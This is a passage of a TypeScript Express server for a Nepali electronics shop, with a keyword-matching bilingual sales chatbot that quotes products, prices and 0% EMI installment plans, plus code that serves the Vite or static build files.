  const underRegex = /(?:under|less than|below|budget of|within|upto|up to|भन्दा मुनि|भन्दा कम|मुनि|कम)\s*(?:nrs\.?|rs\.?|npr\.?)?\s*([0-9,]+)\s*(k|lakh|lakhs)?/i;
  const match = parsedQuery.match(underRegex);
  if (match) {
    let amtStr = match[1].replace(/,/g, "");
    let amt = parseInt(amtStr, 10);
    const suffix = match[2] ? match[2].toLowerCase() : "";
    if (suffix === "k") {
      amt = amt * 1000;
    } else if (suffix.startsWith("lakh")) {
      amt = amt * 100000;
    }
    if (!isNaN(amt)) {
      priceLimit = amt;
    }
  }

  // 5. PRODUCT MODEL SPECIFIC MATCHING
  let matchedProduct: any = null;
  for (const p of products) {
    const mName = p.model.toLowerCase();
    const bName = p.brand.toLowerCase();
    const fullCombined = `${bName} ${mName}`;
    if (parsedQuery.includes(mName) || mName.includes(parsedQuery) || parsedQuery.includes(fullCombined)) {
      matchedProduct = p;
      break;
    } else {
      const modelWords = mName.split(/\s+/).filter((w: string) => w.length > 2);
      const matchesCount = modelWords.filter((w: string) => parsedQuery.includes(w)).length;
      if (matchesCount >= 2 && matchesCount >= modelWords.length / 2) {
        matchedProduct = p;
        break;
      }
    }
  }

  // Evaluate matches
  if (matchedProduct) {
    const p = matchedProduct;
    const isEmi = p.emiAvailable !== false;
    const minDp = p.minDownpaymentPercent !== undefined ? p.minDownpaymentPercent : 35;
    const dpAmt = Math.round((p.price * minDp) / 100);
    const tenures = p.allowedTenures && p.allowedTenures.length > 0 ? p.allowedTenures : [3, 6, 9, 12, 18];
    const maxTenure = Math.max(...tenures);
    const baseInst = Math.round((p.price - dpAmt) / maxTenure);

    let specsText = Object.entries(p.specs || {}).map(([key, val]) => `• **${key}**: ${val}`).join("\n");
    if (!specsText) specsText = isNe ? `• आधिकारिक ब्रान्ड वारेन्टी दिशानिर्देशहरूको साथ प्रिमियम गुणस्तरको ग्यारेन्टी!` : `• Guaranteed premium quality with official brand warranty guidelines!`;

    if (isNe) {
      return `**${p.brand} ${p.model}** एक उत्कृष्ट छनौट हो! यसको विवरणहरू यस प्रकार छन्:

💰 **हालको क्याटलग मूल्य**: NRs. ${p.price.toLocaleString()}
🎨 **उपलब्ध रङहरू**: ${(p.colorOptions || []).join(", ") || "Standard"}

🛠️ **प्राविधिक विशेषताहरू (Specs)**:
${specsText}

💳 **०% ब्याज सहज ईएमआई (EMI)**:
${isEmi 
  ? `- **न्यूनतम डाउनपेमेन्ट (${minDp}%)**: NRs. ${dpAmt.toLocaleString()}
- **किस्ता अवधि (Tenures)**: ${tenures.join(", ")} महिनासम्म उपलब्ध छ!
- **अनुमानित मासिक किस्ता**: मात्र **NRs. ${baseInst.toLocaleString()}/महिना** बाट सुरु (${maxTenure} महिनाको अवधि, *बिल्कुल ०% ब्याज* मा)!`
  : `*नोट*: यस थप मोडल वा एक्सेसरिजको लागि ईएमआई किस्ता उपलब्ध छैन (सीधै खरिद मात्र उपलब्ध छ)।`}

✨ **अर्डर कसरी गर्ने**:
तलको क्याटलगमा यो उत्पादनको कार्डमा क्लिक गर्नुहोस्, **"DETAILS"** मा ट्याप गर्नुहोस्, र कि त **"Buy Directly"** रोज्नुहोस् वा आफ्नो नगद बुझाउन **"Buy on EMI"** को स्लाइडिङ बार मिलाउनुहोस्। आफ्नो बुकिङ फारम बुझाउनुहोस्, र श्री प्रकाश अधिकारीको टिमले तपाईंको सामान घरमै नि:शुल्क डेलिभरी गर्न तुरुन्त कल गर्नेछ!`;
    }

    return `The **${p.brand} ${p.model}** is an outstanding selection! Here are its details:

💰 **Current Catalog Price**: NRs. ${p.price.toLocaleString()}
🎨 **Available Colors**: ${(p.colorOptions || []).join(", ") || "Standard"}

🛠️ **Technical Specifications**:
${specsText}

💳 **0% Interest Easy EMI**:
${isEmi 
  ? `- **Minimum Downpayment (${minDp}%)**: NRs. ${dpAmt.toLocaleString()}
- **Installment Terms**: Supported over ${tenures.join(", ")} months!
- **Estimated Installment Plan**: Starting at just **NRs. ${baseInst.toLocaleString()}/month** over ${maxTenure} months at *absolutely 0% interest*!`
  : `*Note*: EMI installments are not applicable for this dynamic model accessory (outright purchase only).`}

✨ **How to Place Order**:
Click on this product's card in our catalog below, tap **"DETAILS"**, and select either **"Buy Directly"** or adjust the sliding bar under **"Buy on EMI"** to configure your deposit. Submit your booking form, and Mr. Prakash Adhikari's dispatch team will call you to bring your package straight to your doorstep for free!`;
  }

  if (priceLimit !== null) {
    const limit = priceLimit;
    const filtered = products.filter(p => p.price <= limit).sort((a,b) => b.price - a.price);
    if (filtered.length > 0) {
      if (isNe) {
        let r = `हामीले तपाईंको बजेट सीमा **NRs. ${limit.toLocaleString()}** भित्र **${filtered.length} उत्कृष्ट मोडलहरू** भेट्टाएका छौं:\n\n`;
        filtered.slice(0, 5).forEach((p, idx) => {
          const minDp = p.minDownpaymentPercent !== undefined ? p.minDownpaymentPercent : 35;
          const dpAmt = Math.round((p.price * minDp) / 100);
          const estInst = Math.round((p.price - dpAmt) / 12);
          r += `${idx + 1}. **${p.brand} ${p.model}** — **NRs. ${p.price.toLocaleString()}**\n`;
          r += `   *EMI योजना*: मात्र NRs. ${estInst.toLocaleString()}/महिना (${minDp}% डाउनपेमेन्ट, १२ महिनाको अवधि)!\n`;
        });
        r += `\nतपाईं यी विकल्पहरू तल हेर्न सक्नुहुन्छ वा यसको किस्ता हिसाव गर्न 'DETAILS' मा ट्याप गर्नुहोस्!`;
        return r;
      }
      let r = `We have found **${filtered.length} outstanding models** matching your budget constraint of **NRs. ${limit.toLocaleString()}**:\n\n`;
      filtered.slice(0, 5).forEach((p, idx) => {
        const minDp = p.minDownpaymentPercent !== undefined ? p.minDownpaymentPercent : 35;
        const dpAmt = Math.round((p.price * minDp) / 100);
        const estInst = Math.round((p.price - dpAmt) / 12);
        r += `${idx + 1}. **${p.brand} ${p.model}** — **NRs. ${p.price.toLocaleString()}**\n`;
        r += `   *EMI Plan*: From NRs. ${estInst.toLocaleString()}/month with ${minDp}% downpayment over 12 months!\n`;
      });
      r += `\nYou can check out these options below or tap 'DETAILS' to play with the custom installment calculator!`;
      return r;
    } else {
      const cheapest = [...products].sort((a,b)=>a.price-b.price)[0];
      if (isNe) {
        return `हाल हामीसँग **NRs. ${limit.toLocaleString()}** भन्दा मुनिका सामानहरू उपलब्ध छैनन्। सबैभन्दा कम मूल्यको उत्पादन **${cheapest?.brand} ${cheapest?.model}** हो जसको मूल्य **NRs. ${cheapest?.price.toLocaleString()}** छ। के तपाईं सो मोडल हेर्न चाहनुहुन्छ?`;
      }
      return `Currently, we don't have catalog items under **NRs. ${limit.toLocaleString()}**. Our most budget-friendly option is the **${cheapest?.brand} ${cheapest?.model}** priced at **NRs. ${cheapest?.price.toLocaleString()}**. Would you like to check out that model?`;
    }
  }

  if (matchedBrand) {
    const bName = matchedBrand.toUpperCase();
    const filtered = products.filter(p => p.brand.toLowerCase() === matchedBrand);
    if (filtered.length > 0) {
      if (isNe) {
        let r = `हजुर, हामी **${bName}** को आधिकारिक डिलर हौं! हाम्रो स्टोरमा हाल उपलब्ध मोडलहरू यस प्रकार छन्:\n\n`;
        filtered.forEach((p) => {
          r += `• **${p.model}**: NRs. ${p.price.toLocaleString()} (EMI किस्ता मात्र NRs. ${Math.round((p.price * 0.65) / 12).toLocaleString()}/महिनाबाट सुरु, बिल्कुल ०% ब्याजमा!)\n`;
        });
        r += `\nके तपाईं यी ${bName} मोडलहरूका थप प्राविधिक विवरण वा किस्ता प्रक्रियाबारे जान्न चाहनुहुन्छ?`;
        return r;
      }
      let r = `Yes, we are official dealers for **${bName}**! Here is our current lineup available for fast booking:\n\n`;
      filtered.forEach((p) => {
        r += `• **${p.model}**: NRs. ${p.price.toLocaleString()} (EMI plans starting at just NRs. ${Math.round((p.price * 0.65) / 12).toLocaleString()}/month with 0% interest!)\n`;
      });
      r += `\nWould you like more technical details or installment rates for any of these ${bName} models?`;
      return r;
    }
  }

  if (matchedCategory) {
    const categoryName = matchedCategory;
    let categorySearch = "";
    if (["fridge", "refrigerator"].includes(categoryName)) categorySearch = "fridge";
    else if (["ac", "air", "conditioner"].includes(categoryName)) categorySearch = "ac";
    else if (["tv", "television"].includes(categoryName)) categorySearch = "tv";
    else if (["washing", "washer", "dryer", "machine"].includes(categoryName)) categorySearch = "washing machine";
    else if (["phone", "mobile", "smartphone"].includes(categoryName)) categorySearch = "mobile";

    const filtered = products.filter(p => {
      const catVal = String(p.category || "").toLowerCase();
      const modelVal = String(p.model || "").toLowerCase();
      const brandVal = String(p.brand || "").toLowerCase();
      return catVal.includes(categorySearch) || modelVal.includes(categorySearch) || brandVal.includes(categorySearch);
    });

    if (filtered.length > 0) {
      if (isNe) {
        let r = `हाम्रो पसलको क्याटलगमा हाल उपलब्ध उत्कृष्ट **${categorySearch.toUpperCase()}** मोडलहरू निम्न अनुसार छन्:\n\n`;
        filtered.forEach(p => {
          r += `• **${p.brand} ${p.model}** — NRs. ${p.price.toLocaleString()}\n`;
        });
        r += `\nयी सबै हाम्रा **०% ब्याज ईएमआई (EMI)** योजनाका लागि योग्य छन्। थप विवरणहरू हेर्न उत्पादनको कार्डमा **"DETAILS"** मा ट्याप गर्नुहोस्!`;
        return r;
      }
      let r = `Here are the top active **${categorySearch.toUpperCase()}** models available in our store catalog:\n\n`;
      filtered.forEach(p => {
        r += `• **${p.brand} ${p.model}** — NRs. ${p.price.toLocaleString()}\n`;
      });
      r += `\nAll these are eligible for our **0% Interest Easy Installments (EMI)** scheme. You can find detailed features by tapping **"DETAILS"** on their product cards!`;
      return r;
    }
  }

  // 6. EXPENSIVE / BEST / FLAGSHIP
  if (parsedQuery.includes("best") || parsedQuery.includes("premium") || parsedQuery.includes("expensive") || parsedQuery.includes("flagship") || parsedQuery.includes("top-tier") || parsedQuery.includes("highest")) {
    const premiumOnes = [...products].sort((a,b) => b.price - a.price).slice(0, 3);
    if (premiumOnes.length > 0) {
      if (isNe) {
        let r = `यस सिजनका हाल उपलब्ध प्रमुख फ्ल्यागसिप र प्रिमियम उपकरणहरू यस प्रकार छन्:\n\n`;
        premiumOnes.forEach(p => {
          r += `⭐ **${p.brand} ${p.model}** — NRs. ${p.price.toLocaleString()} (०% ब्याज किस्ताको सुबिधा अनुकूलन स्लाइडरसँग उपलब्ध छ!)\n`;
        });
        return r;
      }
      let r = `Here are current flagship, ultra-premium devices of the season:\n\n`;
      premiumOnes.forEach(p => {
        r += `⭐ **${p.brand} ${p.model}** — NRs. ${p.price.toLocaleString()} (0% EMI installments are available with custom sliding options!)\n`;
      });
      return r;
    }
  }

  // 7. CHEAPEST / CHEAP / BUDGET
  if (parsedQuery.includes("cheap") || parsedQuery.includes("budget") || parsedQuery.includes("affordable") || parsedQuery.includes("lowest") || parsedQuery.includes("lowest price")) {
    const budgetOnes = [...products].sort((a,b) => a.price - b.price).slice(0, 3);
    if (budgetOnes.length > 0) {
      if (isNe) {
        let r = `हाम्रा सबैभन्दा सुलभ र बजेट-अनुकुल मोडलहरू यस प्रकार छन्:\n\n`;
        budgetOnes.forEach(p => {
          r += `• **${p.brand} ${p.model}** — **NRs. ${p.price.toLocaleString()}** (मासिक किस्ता योजना एकदमै सस्तो दरमा सुरु हुन्छ!)\n`;
        });
        return r;
      }
      let r = `Here are our most affordable, budget-friendly models:\n\n`;
      budgetOnes.forEach(p => {
        r += `• **${p.brand} ${p.model}** — **NRs. ${p.price.toLocaleString()}** (Incredibly light on updates, with plans starting at low monthly numbers!)\n`;
      });
      return r;
    }
  }

  // 8. STORE INFO QUESTIONS
  if (parsedQuery.includes("address") || parsedQuery.includes("where") || parsedQuery.includes("locate") || parsedQuery.includes("thutipipal") || parsedQuery.includes("map") || parsedQuery.includes("location") || parsedQuery.includes("route")) {
    if (isNe) {
      return `📍 **रियान को पसल (Riaan Enterprises)** सिद्धार्थ राजमार्ग नजिकै, **ओमसतिया-१, थुटिपिपल, रुपन्देही, लुम्बिनी, नेपाल** को केन्द्रमा अवस्थित छ। 

हामी आधिकारिक ब्रान्ड वारेन्टीका साथै थुटिपिपल, भैरहवा, बुटवल र वरपरका क्षेत्रमा नि:शुल्क होम डेलिभरी र जडानको व्यवस्था मिलाउँछौं! कृपया पसलमा आउनुहोस् वा यहाँ सिधै बुकिङ गर्नुहोस्!`;
    }
    return `📍 **Riaan Ko Pasal (Riaan Enterprises)** is situated at the highly accessible standard hub of **Omsatiya-1, Thutipipal, Rupandehi, Lumbini, Nepal** (near Siddhartha Highway). 
    
We are physical appliance specialists, offering fully certified electronics, official brand-warranties, and immediate home delivery in Thutipipal, Bhairahawa, Butwal, and neighboring regions! Please stop by or secure your booking digitally!`;
  }

  // Mr. Prakash Adhikari
  if (parsedQuery.includes("prakash") || parsedQuery.includes("adhikari") || parsedQuery.includes("owner") || parsedQuery.includes("who is prakash")) {
    if (isNe) {
      return `श्री **प्रकाश अधिकारी** **रियान को पसल** को आदरणीय प्रबन्ध निर्देशक र सञ्चालक हुनुहुन्छ। रुपन्देहीको व्यापारिक क्षेत्रमा उहाँ ग्राहक-मुखी सिद्धान्त र पारदर्शी मूल्यका लागि अत्यन्त परिणत हुनुहुन्छ। उहाँकै सेवा नीति अन्तर्गत हामी रुपन्देही जिल्लाभरि नि:शुल्क डेलिभरी र ०% व्याज दरमा ईएमआई प्रदान गर्दछौं!`;
    }
    return `Mr. **Prakash Adhikari** is the esteemed Managing Director and sole founder of **Riaan Ko Pasal**. He's recognized in the Rupandehi business sector for his client-centric principles, guaranteeing transparent pricing without hidden transaction markups. Under his service policies, we offer 0% EMI schemes and free home setup for all of Rupandehi district!`;
  }

  // EMI info
  if (parsedQuery.includes("emi") || parsedQuery.includes("interest") || parsedQuery.includes("installment") || parsedQuery.includes("percent") || parsedQuery.includes("months") || parsedQuery.includes("schedule")) {
    if (isNe) {
      return `💳 **हाम्रो ०% ब्याज सहज ईएमआई (EMI) मार्गदर्शन**:

1. **कुनै अतिरिक्त ब्याज लाग्दैन**: तपाईंले तोकिएको मूल्य मात्र किस्तामा बुझाउनु पर्छ—कुनै अतिरिक्त ब्याज लाग्दैन।
2. **समयावधि (Tenure)**: किस्ता तिर्ने अवधि **३, ६, ९, १२, वा १८ महिना** सम्म रोज्न सकिन्छ।
3. **सजिलो स्लाइडर**: प्रत्येक उत्पादनको सुचीमा एउटा स्लाइडर छ। त्यसलाई सारेर डाउनपेमेन्ट प्रतिशत र मासिक किस्ता सजिलै हेर्नुहोस्!
4. **सजिलो बुकिङ**: फारम बुझाएपछि श्री प्रकाश अधिकारीको टोलिले कल गरेर सुरक्षित डेलिभरी प्रक्रिया अघि बढाउनेछ!`;
    }
    return `💳 **Our 0% Interest EMI Installment guide**:
    
1. **Zero Added Markup**: You pay exactly the listed product price—absolutely zero interest is accrued.
2. **Tenure Options**: Settle options over **3, 6, 9, 12, or 18 months**.
3. **Easy Sliders**: Every product detail card features a custom, interactive sliding bar. Drag it to define your down payment percentage and check your monthly installment estimations instantly!
4. **Finalization Step**: Submit the secure booking on our portal. Prakash Adhikari's staff will call you right back to verify paperwork and manage free dispatch!`;
  }

  // 8.5. STRUCTURED FAQS (Q&A) DYNAMIC KEYWORD OVERLAP MATCHING
  const faqsList = botConfig.faqs || [];
  if (faqsList.length > 0) {
    let bestFaq = null;
    let bestFaqScore = 0;

    const queryTermClean = parsedQuery.replace(/[?.,\/#!$%\^&\*;:{}=\-_`~()]/g, "").trim();
    const queryWords = queryTermClean.split(/\s+/).filter((w: string) => w.length > 2);

    for (const faq of faqsList) {
      const qClean = faq.question.toLowerCase().replace(/[?.,\/#!$%\^&\*;:{}=\-_`~()]/g, "");
      
      // Exact / substring matching
      if (queryTermClean.includes(qClean) || qClean.includes(queryTermClean)) {
        bestFaq = faq;
        bestFaqScore = 20; // Maximum override score
        break;
      }

      // Keyword matching
      let score = 0;
      const qWords = qClean.split(/\s+/).filter((w: string) => w.length > 2);
      for (const word of queryWords) {
        if (qWords.includes(word)) {
          score += 3;
        } else if (qClean.includes(word)) {
          score += 1.5;
        }
      }

      if (score > bestFaqScore) {
        bestFaqScore = score;
        bestFaq = faq;
      }
    }

    if (bestFaq && bestFaqScore >= 3) {
      return bestFaq.answer;
    }
  }

  // 9. RELEVANCE SEARCH IN CUSTOM KNOWLEDGE BASE (BM25-style keyword frequency overlap)
  const knowledgeBaseText = botConfig.systemInstruction || "";
  if (knowledgeBaseText.length > 10) {
    // Split knowledgeBaseText into sentences/paragraphs
    const sentences = knowledgeBaseText
      .split(/\n+/)
      .map((s: string) => s.trim())
      .filter((s: string) => s.length > 15 && !s.includes("{{PRODUCTS_CATALOG}}"));

    let bestSentence = "";
    let bestScore = 0;

    // Filter user question words to avoid noise
    const queryWords = parsedQuery
      .replace(/[?.,\/#!$%\^&\*;:{}=\-_`~()]/g, "")
      .split(/\s+/)
      .filter((w: string) => w.length > 3 && !["what", "your", "with", "have", "about", "does", "where", "from"].includes(w));

    for (const sentence of sentences) {
      const cleanSentence = sentence.toLowerCase().replace(/[?.,\/#!$%\^&\*;:{}=\-_`~()]/g, "");
      let score = 0;
      for (const word of queryWords) {
        if (cleanSentence.includes(word)) {
          score += 2; // Match query term
        }
      }
      if (score > bestScore) {
        bestScore = score;
        bestSentence = sentence;
      }
    }

    if (bestScore >= 2 && bestSentence) {
      // Return matching sentence/bullet point clean of lead numbering
      return bestSentence.replace(/^[0-9*.\-\s+]+/, "").trim();
    }
  }

  // 10. INTELLIGENT COMPREHENSIVE FALLBACK
  if (isNe) {
    return `**${botName} भर्चुअल स्टोर असिस्टेन्ट** मा सोधपुछ गर्नुभएकोमा धन्यवाद! म तपाईंलाई निम्न विषयहरूमा सहयोग गर्न सक्छु:
• **०% ब्याज सहज ईएमआई मूल्य योजना** र किस्ता अवधि हिसाव।
• हाल मौज्दात रहेका ब्रान्डहरू: ${Array.from(new Set(products.map(p => p.brand))).join(", ")}।
• रुपन्देही जिल्लाभरि नि:शुल्क होम डेलिभरी र जडान प्रक्रिया।
• श्री प्रकाश अधिकारी एवं स्टोर सञ्चालनका अन्य नियमहरू।

तपाईं आज फ्रीज (फ्रिज), वासिङ मेसिन, एसी, स्मार्ट टिभी वा नयाँ स्मार्टफोन मध्ये कुन कुरा खरिद गर्न खोज्दै हुनुहुन्छ?`;
  }

  return `Thank you for consulting **${botName}'s Virtual Store Assistant!** I can assist you offline with:
• **0% Easy EMI pricing plans** & choosing custom downpayment schemes.
• Available brands in stock: ${Array.from(new Set(products.map(p => p.brand))).join(", ")}.
• Free home shipping policies in Rupandehi District, Nepal.
• Mr. Prakash Adhikari's store guidelines.

Could you specify the type of device (Washing Machine, Fridge, Split AC, Smart TV, or Smartphone) you're shopping for today?`;
}

// API: AI Assistant chat proxy (Fully self-contained & customizable chatbot matching engine)
app.post("/api/chat", async (req, res) => {
  const { message, history, language } = req.body;
  if (!message) {
    return res.status(400).json({ reply: "Please type in your purchase query." });
  }

  try {
    let currentProducts = [];
    try {
      currentProducts = await getProducts();
    } catch (e) {
      currentProducts = DEFAULT_PRODUCTS_CATALOG;
    }

    let botConfig = {
      botName: "Riaan",
      systemInstruction: "",
      welcomeMessage: "Namaste! Welcome...",
      presetPrompts: []
    };
    try {
      botConfig = await getBotConfig();
    } catch (e) {
      console.warn("Fallback using default system instructions template.");
    }

    const reply = getLocalIntelligentResponse(message, history || [], botConfig, currentProducts, language);
    const cleanReply = reply ? reply.replace(/\*\*/g, "") : "";
    res.json({ reply: cleanReply });
  } catch (err: any) {
    console.error("Local intelligent chatbot match error:", err);
    res.status(500).json({ reply: "Namaste! I experienced a momentary challenge. Please try again!" });
  }
});

// Configure Vite or serve build static files
const servesViteOrBuildFiles = async () => {
  const httpServer = http.createServer(app);

  if (process.env.NODE_ENV !== "production") {
    // Serve our attachment static files explicitly in development
    app.use(express.static(publicDir));

    const vite = await createViteServer({
      server: { 
        middlewareMode: true,
        hmr: { server: httpServer }
      },
      appType: "spa",
    });
    app.use(vite.middlewares);
    console.log("Vite development middleware integrated successfully.");
  } else {
    const distPath = path.join(process.cwd(), "dist");
    
    // Serve React build artifacts and local public directory combined
    app.use(express.static(distPath));
    app.use(express.static(publicDir));
    
    // Fallback everything else to index.html
    app.get("*", (req, res) => {
      const fallbackFile = path.join(distPath, "index.html");
      res.sendFile(fallbackFile, (err) => {
        if (err) {
          console.error(`[ERROR] Failed to send index.html:`, err);
          res.status(500).send(`Server error: Unable to load application index.html. File path: ${fallbackFile}`);
        }
      });
    });
    console.log("Static production files serving initiated.");
  }

  httpServer.listen(PORT, "0.0.0.0", () => {
    console.log(`Riaan Ko Pasal is fully online on http://localhost:${PORT}`);
  });
};

servesViteOrBuildFiles();
